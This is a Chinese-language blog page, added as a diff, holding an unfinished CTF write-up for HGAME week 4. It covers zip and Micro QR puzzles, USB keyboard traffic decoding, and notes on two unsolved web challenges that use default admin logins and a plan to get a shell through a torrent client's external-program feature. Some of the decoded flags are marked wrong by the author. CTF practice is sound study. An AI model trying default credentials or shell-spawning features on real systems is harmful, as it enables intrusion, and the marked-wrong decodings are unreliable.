@@ -1,0 +1,1027 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="s0k1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="MISC maybezip 异或文件头尾   看到有密码 怀疑伪加密 ![img](file:&#x2F;&#x2F;&#x2F;C:&#x2F;Users&#x2F;asus&#x2F;AppData&#x2F;Local&#x2F;Packages&#x2F;Microsoft.Windows.Photos_8wekyb3d8bbwe&#x2F;TempState&#x2F;ShareServiceTempFolder&#x2F;屏幕截图%202024-02-22%20134248.jpeg) 无效  binw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME_WEEK4">
+<meta property="og:url" content="https://s0k1y.github.io/2024/03/13/HGAME-WEEK4/index.html">
+<meta property="og:site_name" content="s0k1y&#39;s world">
+<meta property="og:description" content="MISC maybezip 异或文件头尾   看到有密码 怀疑伪加密 ![img](file:&#x2F;&#x2F;&#x2F;C:&#x2F;Users&#x2F;asus&#x2F;AppData&#x2F;Local&#x2F;Packages&#x2F;Microsoft.Windows.Photos_8wekyb3d8bbwe&#x2F;TempState&#x2F;ShareServiceTempFolder&#x2F;屏幕截图%202024-02-22%20134248.jpeg) 无效  binw">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222134730825.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222135021296.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222135247457.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222145700116.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222145953808.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222165530581.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174416590.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226204826884.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226224139607.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226231926197.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226232523320.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174403592.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174547959.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174851694.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223185403507.png">
+<meta property="article:published_time" content="2024-03-13T14:40:36.000Z">
+<meta property="article:modified_time" content="2024-03-13T14:43:31.715Z">
+<meta property="article:author" content="s0k1y">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222134730825.png">
+  
+  
+  
+  <title>HGAME_WEEK4 - s0k1y&#39;s world</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s0k1y.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HGAME_WEEK4"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-13 22:40" pubdate>
+          2024年3月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          75 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HGAME_WEEK4</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>MISC</h1>
+<h6 id="maybezip">maybezip</h6>
+<p>异或文件头尾</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222134730825.png" srcset="/img/loading.gif" lazyload alt="image-20240222134730825"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222135021296.png" srcset="/img/loading.gif" lazyload alt="image-20240222135021296"></p>
+<p>看到有密码</p>
+<p>怀疑伪加密</p>
+<p>![img](file:///C:/Users/asus/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/TempState/ShareServiceTempFolder/屏幕截图%202024-02-22%20134248.jpeg)</p>
+<p>无效</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222135247457.png" srcset="/img/loading.gif" lazyload alt="image-20240222135247457"></p>
+<p>binwalk/foremost</p>
+<p>提取不出来</p>
+<p>没有得到有效信息</p>
+<p>我也没遗漏什么</p>
+<p>查看文件内容</p>
+<p>查看文件属性详细信息，文件模板信息后无其他收获，但看到了有一大批文件的crc32，难道是用crc32爆字段拼接作为压缩包密码</p>
+<p>不是</p>
+<p>观察到修改日期为11:45:10和11:45:11一直往复，联想到0，1，考虑莫斯密码或者二进制数转Ascii</p>
+<p>0111011101101000011000010111010001011111011010010111001101011111011101000111010101110000011100000110010101110010000000</p>
+<p>二进制转ascii</p>
+<p>英文：what_is_tupper</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222145700116.png" srcset="/img/loading.gif" lazyload alt="image-20240222145700116"></p>
+<p>解开了</p>
+<p>mysecret.txt</p>
+<p>72787329722350998523574511481025741695816964635558384442202692939343248310376327030571721790484320025639585496019827224602471287007761473980149004940777747516726397947570387847197684612123397221275637895906801626770725781059540346505583447207934842610736780599158011743292266079872879933007002989543949378274627880371860121401625757157150102247415160667449047918620926981653540058785455789486477133491800072173111744740084775454371941475267611983872</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44143678/article/details/119869423"><strong>Tupper‘s Self-Referential Formula</strong> 塔珀自指公式 - CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222145953808.png" srcset="/img/loading.gif" lazyload alt="image-20240222145953808"></p>
+<p>得到一个码</p>
+<p>要么就是加密/损坏了，要么就是不完整1/4个码了</p>
+<p>找了一下其它图片也没有</p>
+<p>考虑加密</p>
+<p>17x17的</p>
+<p>又想了想，如果只是一个码的话，这个一定是二维码，查了查相关的变种二维码，没有比较相似的，那么只能是常规二维码，而现在二维码的定位线也没有了，利用局部信息进行识别，在常规的几个识别工具识别不了的情况下，只能尝试手译一下版本信息，然后手动导入到QRazyBox求解</p>
+<p>思路错误</p>
+<p>回归到变种二维码</p>
+<p>找到了</p>
+<p>MicroQRCode</p>
+<p>维码上只有一个定位图案，这就是Micro QR码的一大特点。由于普通的QR码在3个角落上设置了定位图案，因此必须保证一定的尺寸。<br>
+另外，普通的QR码的边缘还必须留出至少4码元的空白，但Micro QR码的边缘只需要留出2码元的空白就足够了。Micro QR码发挥这一结构上的优势，可以在比QR码更小的空间内打印。</p>
+<p><strong>Can iPhones read micro QR codes?</strong><br>
+Micro QR codes can be read by iPhones, but you’ll need the right app, such as <a target="_blank" rel="noopener" href="https://scand.it/1Pk34m.qr">Scandit Express</a>. You can’t just use the built-in camera app or any QR code scanner from the App Store.</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240222165530581.png" srcset="/img/loading.gif" lazyload alt="image-20240222165530581"></p>
+<p>美化一下</p>
+<p>![img](file:///C:/Users/asus/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/TempState/ShareServiceTempFolder/屏幕截图%202024-02-22%20164453.jpeg)</p>
+<p>找decoder</p>
+<p>在GitHub上翻到回答</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/heuer/segno/issues/63"><br>
+help! How to decode micro QR code · Issue #63<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAb1BMVEX////4+Pi3ubtvcnZNUVU+Q0cpLjLr6+x3en0sMTYkKS59gIORk5aUl5n8/Pzw8PFTV1tbX2Pc3d5DSEzn5+g3PECLjpFKTlKFh4qxs7XCxMUwNTq/wcLh4uPV1tZzd3o/Q0jOz9CmqKpjZ2qfoaSrd37mAAABPUlEQVR4AW3TBZKEMBAF0B8GCHzcnbW5/xm30qEyknklcU/DgQpuYRTHUXgLFHw6SemkmcYrlcd8kRYlnlQ1PU0Fp434Qde75Qd+1FUQKiRZjyGfTGNjKhWMmSQXYO3Ibao3MlqBnSRzADhk/ycAdcqclSSHnEUD+KLt8KalMQMqpl3izU5jKxHQGCq8Ud80fq4VfuFZaIyQO4wVPEre5g+RrIAPJrkQSL8OPjv3htQmH8guU5uwgseeP7ITMYBnpdFgvlJPcx0zoLjjzS/FDrVRvH6xsqDYlLx29huRUaFx6YuI1mhKMbddf9trEzca7rmRk/FxpiRXiJO8FDBURyb4yfO7glC8TOpacmAc4ElMEWlc2oGckjwvYVFEB5wjouE6uLBwquypQym/scKrM4njElYaJy182q15aDj/oQMZkS8JH3IAAAAASUVORK5CYII=" srcset="/img/loading.gif" lazyload alt="img">GitHubhttps://github.com › heuer › segno › issues</a></p>
+<p>2020年1月9日 — I’ve written a <em>Micro QR Code decoder</em> / scanner / reader and included it in BoofCV. PyBoof is the Python wrapper. Example Code.</p>
+<p>Do you search for an app which can decode Micro QR Codes? I.e. <a target="_blank" rel="noopener" href="https://apps.apple.com/de/app/barcode-scanner-and-qr-reader/id601172795">https://apps.apple.com/de/app/barcode-scanner-and-qr-reader/id601172795</a> is capable to decode Micro QR Codes.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/edwardocano">@edwardocano</a>, ensure that you’ve checked “Micro QR code” in the settings.<br>
+It may be deactivated by default.<br>
+The app is capable to decode Micro QR codes</p>
+<p>appple store下载软件</p>
+<p>识别得到</p>
+<p>![img](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2024-02\Ori\89d381261441367fa6bbc06c90cb29ee.jpeg)</p>
+<p>hgame{Matryo5hk4_d01l}</p>
+<p>第一个链接登录抓包</p>
+<p>发现是base64(username:password)这种加密传输</p>
+<p>这种的话直接burp没法爆 除非脚本写专门的密码本</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174416590.png" srcset="/img/loading.gif" lazyload alt="image-20240223174416590"></p>
+<h6 id="ezkeyboard-解出来的flag不对">ezkeyboard [解出来的flag不对 ]</h6>
+<p>usb流</p>
+<p>hid类</p>
+<p>与captured类做法不同</p>
+<p>usb.capdata || usbhid.data</p>
+<p>找出包</p>
+<p>usb.hiddata是16个十六进制数据</p>
+<p>也就是8bytes</p>
+<p>键盘数据</p>
+<p>找到官方协议进行手动译码</p>
+<p><a target="_blank" rel="noopener" href="https://www.usb.org/sites/default/files/hid1_11.pdf">https://www.usb.org/sites/default/files/hid1_11.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.baiheee.com/OpenSource/Easy%20USB%2051%20Programer/Easy%20USB%2051%20Programer12.htm">http://www.baiheee.com/OpenSource/Easy USB 51 Programer/Easy USB 51 Programer12.htm</a></p>
+<p>中文版</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226204826884.png" srcset="/img/loading.gif" lazyload alt="image-20240226204826884"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhoutaopower/article/details/82469665">https://blog.csdn.net/zhoutaopower/article/details/82469665</a></p>
+<p>再读这篇文章学USB HID Report input 协议</p>
+<table>
+<thead>
+<tr>
+<th>Usage (<strong>Keyboard</strong>),</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>再去学这两个</p>
+<p><em>《Device Class Definition for human interface device (HID)》</em></p>
+<p><em>《Universal Serial Bus HID Usage Tables》</em></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226224139607.png" srcset="/img/loading.gif" lazyload alt="image-20240226224139607"></p>
+<p>译码表</p>
+<p>对比报文</p>
+<p>0531开头的基本全是053159和053157</p>
+<p>其它的一堆0和几个1的感觉就更扯了</p>
+<p>01000000ff这种是鼠标数据流</p>
+<p>直接就是引导数据</p>
+<p>发现5d010000这种比较异常</p>
+<p>ctrl f</p>
+<p>查找5d01</p>
+<p>发现前4个字节有共同特征</p>
+<p>5d010000</p>
+<p>尝试翻译</p>
+<p>第一个</p>
+<p>reversed 这种全部去掉</p>
+<p>第二个0b  欸 h</p>
+<p>第四个  g</p>
+<p>同理</p>
+<p>a</p>
+<p>m</p>
+<p>m</p>
+<p>e</p>
+<p>k</p>
+<p>DELETE</p>
+<p>差不多</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226231926197.png" srcset="/img/loading.gif" lazyload alt="image-20240226231926197"></p>
+<p>0501开头的是标识哪台设备</p>
+<p>//表示用途页为通用桌面设备        0x05, 0x01,</p>
+<p>这个包也没用</p>
+<p>删掉</p>
+<p>与原协议反复对比</p>
+<p>发现capture的原协议是</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240226232523320.png" srcset="/img/loading.gif" lazyload alt="image-20240226232523320"></p>
+<p>那么现在hid的按键位在第5字节上</p>
+<p>接着翻译的时候发现了2个m</p>
+<p>查了一下</p>
+<p>这是按的久了</p>
+<p>就会一直出现</p>
+<p>然后对应的有时间帧来确定你按了几个</p>
+<p>然后第五个字节为39时 CAP大写 第六个字节为按键</p>
+<p>hgammek ？DELETE e  Yb0a1dgam015s01nst DEL DEL DEL DEL f0n</p>
+<p>键盘游戏很刺激?</p>
+<p>不对</p>
+<p>这段数据缺东西</p>
+<p>重新分析报文！</p>
+<p>真相只有一个！</p>
+<p>050102的 也是数据！</p>
+<p>hgamme{ k -  DELETE e  Yb0a1d-gam0–15-s0-1nst DEL DEL DEL DEL f0n–11<GA><GA><GA><GA>}</p>
+<p><GA>= ~</p>
+<p>仔细看看大小写</p>
+<p>hgame{keYb0a1d_gam0_15_s0_f0n-11~~~~}</p>
+<p>不知道哪错了</p>
+<p>写脚本吧</p>
+<p>5d0100000b000000000000000000000000000000000000000000000000000000<br>
+5d0100000a000000000000000000000000000000000000000000000000000000<br>
+5d01000004000000000000000000000000000000000000000000000000000000<br>
+5d01000010000000000000000000000000000000000000000000000000000000<br>
+5d01000010000000000000000000000000000000000000000000000000000000<br>
+5d01000008000000000000000000000000000000000000000000000000000000<br>
+5d0102002f000000000000000000000000000000000000000000000000000000<br>
+5d0100000e000000000000000000000000000000000000000000000000000000<br>
+5d0102002d000000000000000000000000000000000000000000000000000000<br>
+5d0100002a000000000000000000000000000000000000000000000000000000<br>
+5d01000008000000000000000000000000000000000000000000000000000000<br>
+5d010000391c0000000000000000000000000000000000000000000000000000<br>
+5d01000005000000000000000000000000000000000000000000000000000000<br>
+5d01000027000000000000000000000000000000000000000000000000000000<br>
+5d01000004000000000000000000000000000000000000000000000000000000<br>
+5d0100001e000000000000000000000000000000000000000000000000000000<br>
+5d01000007000000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d010200392d0000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d0100000a000000000000000000000000000000000000000000000000000000<br>
+5d01000004000000000000000000000000000000000000000000000000000000<br>
+5d01000010000000000000000000000000000000000000000000000000000000<br>
+5d01000027000000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d010200392d0000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d010200392d0000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d0100001e000000000000000000000000000000000000000000000000000000<br>
+5d01000022000000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d010200392d0000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d01000016000000000000000000000000000000000000000000000000000000<br>
+5d01000027000000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d010200392d0000000000000000000000000000000000000000000000000000<br>
+5d01020039000000000000000000000000000000000000000000000000000000<br>
+5d0100001e000000000000000000000000000000000000000000000000000000<br>
+5d01000011000000000000000000000000000000000000000000000000000000<br>
+5d01000016000000000000000000000000000000000000000000000000000000<br>
+5d01000017000000000000000000000000000000000000000000000000000000<br>
+5d0100002a000000000000000000000000000000000000000000000000000000<br>
+5d0100002a000000000000000000000000000000000000000000000000000000<br>
+5d0100002a000000000000000000000000000000000000000000000000000000<br>
+5d0100002a000000000000000000000000000000000000000000000000000000<br>
+5d01000009000000000000000000000000000000000000000000000000000000<br>
+5d01000027000000000000000000000000000000000000000000000000000000<br>
+5d01000011000000000000000000000000000000000000000000000000000000<br>
+5d0102002d000000000000000000000000000000000000000000000000000000<br>
+5d0102002d000000000000000000000000000000000000000000000000000000<br>
+5d0102001e000000000000000000000000000000000000000000000000000000<br>
+5d0102001e000000000000000000000000000000000000000000000000000000<br>
+5d01020035000000000000000000000000000000000000000000000000000000<br>
+5d01020035000000000000000000000000000000000000000000000000000000<br>
+5d01020035000000000000000000000000000000000000000000000000000000<br>
+5d01020035000000000000000000000000000000000000000000000000000000<br>
+5d01020030000000000000000000000000000000000000000000000000000000<br>
+5d01010000000000000000000000000000000000000000000000000000000000</p>
+<p>0b  h<br>
+0a  g<br>
+04  a<br>
+10  m<br>
+10  m<br>
+08  e<br>
+2f  [<br>
+0e k<br>
+2d -<br>
+2a DEL<br>
+08 e<br>
+39:1c Y<br>
+05 b<br>
+27 0<br>
+04 a<br>
+1e 1<br>
+07 d<br>
+39:2d _<br>
+0a g<br>
+04 a<br>
+10 m<br>
+27 0<br>
+39:2d _<br>
+39:2d _<br>
+1e  1<br>
+22 5<br>
+39:2d _<br>
+16 s<br>
+27 0<br>
+39:2d _<br>
+1e 1<br>
+11 n<br>
+16 s<br>
+17 t<br>
+2a  del<br>
+2a del<br>
+2a del<br>
+2a del<br>
+09 f<br>
+27 0<br>
+11 n<br>
+2d -<br>
+2d -<br>
+1e 1<br>
+1e 1<br>
+35 ~<br>
+35 ~<br>
+35 ~<br>
+35 ~<br>
+30 ]</p>
+<p>hgame[keYb0a1d_gam0_15_s0_f0n-1~]</p>
+<p>坏了</p>
+<p>我忘了处理shift了</p>
+<p>CAP只是处理大写</p>
+<p>02是shift</p>
+<p>0b h<br>
+0a g<br>
+04 a<br>
+10 m<br>
+10 m<br>
+08 e<br>
+SHIFT2f {<br>
+0e k<br>
+SHIFT2d _<br>
+2a DEL<br>
+08 e<br>
+CAP1c Y<br>
+05 b<br>
+27 0<br>
+04 a<br>
+1e 1<br>
+07 d<br>
+SHIFTCAP<br>
+SHIFTCAP2d _<br>
+SHIFTCAP<br>
+0a g<br>
+04 a<br>
+10 m<br>
+27 0<br>
+SHIFTCAP<br>
+SHIFTCAP2d _<br>
+SHIFTCAP<br>
+SHIFTCAP2d _<br>
+SHIFTCAP<br>
+1e 1<br>
+22 5<br>
+SHIFTCAP<br>
+SHIFTCAP2d _<br>
+SHIFTCAP<br>
+16 s<br>
+27 0<br>
+SHIFTCAP<br>
+SHIFTCAP2d _<br>
+SHIFTCAP<br>
+1e<br>
+11<br>
+16<br>
+17</p>
+<p>2a<br>
+2a<br>
+2a<br>
+2a<br>
+09 f<br>
+27 0<br>
+11 n<br>
+SHIFT2d _<br>
+SHIFT2d _<br>
+SHIFT1e !<br>
+SHIFT1e !<br>
+SHIFT35 ~<br>
+SHIFT35 ~<br>
+SHIFT35 ~<br>
+SHIFT35 ~<br>
+SHIFT30 }</p>
+<p>hgame{keYb0a1d_gam0_15_s0_f0n_!~~}</p>
+<p>连续相同按键的处理问题</p>
+<p>实际敲文本测试的时候发现解析出来的文本会比实际敲的多出几个重复的字符，看了下流量数据发现是连续的相同按键的问题。按下一个按键的时间比较短的时候，输入的就会是一个字符；按住的时间长了，它就会变成重复的一串字符。</p>
+<p>还缺东西</p>
+<p>缺了什么呢</p>
+<p>真相只有一个！</p>
+<p>010000 390000000000000000000000000000000000000000000000000000000000</p>
+<p>那就是这样的也是关键数据</p>
+<p>010100060000000000000000000000000000000000000000000000000000000000</p>
+<p>c</p>
+<p>这东西就是</p>
+<h1>WEB</h1>
+<h6 id="ActiveMQ【未做出】">ActiveMQ【未做出】</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174403592.png" srcset="/img/loading.gif" lazyload alt="image-20240223174403592"></p>
+<p>admin admin 登录成功</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174547959.png" srcset="/img/loading.gif" lazyload alt="image-20240223174547959"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223174851694.png" srcset="/img/loading.gif" lazyload alt="image-20240223174851694"></p>
+<p>5.17.3</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240223185403507.png" srcset="/img/loading.gif" lazyload alt="image-20240223185403507"></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>/opt/activemq</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
+<p>5.17.3</p>
+<h6 id="Whosename【未做出】">Whosename【未做出】</h6>
+<p>admin adminadmin登录</p>
+<p>之后找漏洞</p>
+<p>发现4.5.5之前有一个路径遍历漏洞</p>
+<p>但4.52已经恢复了</p>
+<p>没思路</p>
+<p>经过学习之后，我了解到了这一软件的作用，可以远程控制主机下载文件，那么我就可以把木马做成torrent文件传进去，然后试图连接</p>
+<p>不行，没有文件解析漏洞的话，单独文件上传不行的</p>
+<p>查阅设置中的功能</p>
+<p><strong>看到了运行外部程序</strong></p>
+<p>![img](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2024-02\Ori\79ce26bb7f505ee0778836893e9fff5c.png)</p>
+<p>想办法弹shell</p>
+<p>去网上查</p>
+<p>发现它这里这个运行外部程序是支持sh脚本格式的</p>
